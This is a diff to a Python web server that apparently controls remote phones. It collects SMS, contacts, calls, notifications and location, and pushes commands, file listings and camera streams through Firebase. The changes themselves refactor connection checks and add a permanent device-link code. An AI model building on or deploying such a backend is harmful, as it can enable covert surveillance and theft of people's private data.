@@ -17,8 +17,9 @@ from .config import (
 )
 from .store import store
 from .commands import COMMAND_REGISTRY, CMD_CATEGORIES, get_all_categories
+from . import firebase_client as _fb
 from .firebase_client import (
-    firebase_connected, push_command, store_sms, store_contacts,
+    push_command, store_sms, store_contacts,
     store_calls, store_notifications, store_device_info, store_location
 )
 from .file_storage import save_upload, save_base64_upload, get_file, get_storage_stats
@@ -81,7 +82,7 @@ async def api_health(request: web.Request) -> web.Response:
         "ok": True,
         "status": "running",
         "version": VERSION,
-        "firebase": firebase_connected,
+        "firebase": _fb.firebase_connected,
         "uptime": int(time.time() - store.start_time),
         "devices": len(store.devices),
         "commands": len(store.commands),
@@ -113,6 +114,14 @@ async def api_login(request: web.Request) -> web.Response:
     
     await store.add_event("auth", f"User logged in: {user['username']} (web)", "success", user_id=user['id'])
     
+    # Get or create permanent link code
+    permanent_code = await store.get_or_create_permanent_code(user['id'])
+
+    # Sync to Firebase
+    if _fb.firebase_connected:
+        from .firebase_client import sync_permanent_code
+        await sync_permanent_code(user['email'], permanent_code, user['id'])
+
     return json_response({
         "ok": True,
         "success": True,
@@ -122,6 +131,7 @@ async def api_login(request: web.Request) -> web.Response:
         "username": user['username'],
         "role": user['role'],
         "email": user['email'],
+        "permanent_code": permanent_code,
         "message": "تم تسجيل الدخول بنجاح"
     })
 
@@ -574,7 +584,7 @@ async def api_web_send_command(request: web.Request) -> web.Response:
     )
     
     # Push to Firebase
-    if firebase_connected:
+    if _fb.firebase_connected:
         await push_command(device_id, {
             "id": queued['id'],
             "command": actual_cmd,
@@ -714,6 +724,19 @@ async def api_web_delete_user(request: web.Request) -> web.Response:
     return json_response({"ok": False, "message": "User not found"}, 404)
 
 
+async def api_web_regenerate_code(request: web.Request) -> web.Response:
+    session = get_auth_session(request)
+    if not session:
+        return json_response({"ok": False, "message": "Unauthorized"}, 401)
+    new_code = await store.regenerate_permanent_code(session['user_id'])
+    if _fb.firebase_connected:
+        from .firebase_client import sync_permanent_code
+        user = await store.get_user(session['user_id'])
+        if user:
+            await sync_permanent_code(user['email'], new_code, session['user_id'])
+    return json_response({"ok": True, "code": new_code})
+
+
 # ─── File Management API ──────────────────────────────────────
 
 async def api_web_files(request: web.Request) -> web.Response:
@@ -762,7 +785,7 @@ async def api_web_list_files_device(request: web.Request) -> web.Response:
         source="web"
     )
     
-    if firebase_connected:
+    if _fb.firebase_connected:
         await push_command(device_id, {
             "id": queued['id'],
             "command": "list_files",
@@ -893,7 +916,7 @@ async def api_jpeg_stream_start(request: web.Request) -> web.Response:
                     source="jpeg_stream"
                 )
                 
-                if firebase_connected:
+                if _fb.firebase_connected:
                     await push_command(device_id, {
                         "id": queued['id'],
                         "command": cmd,
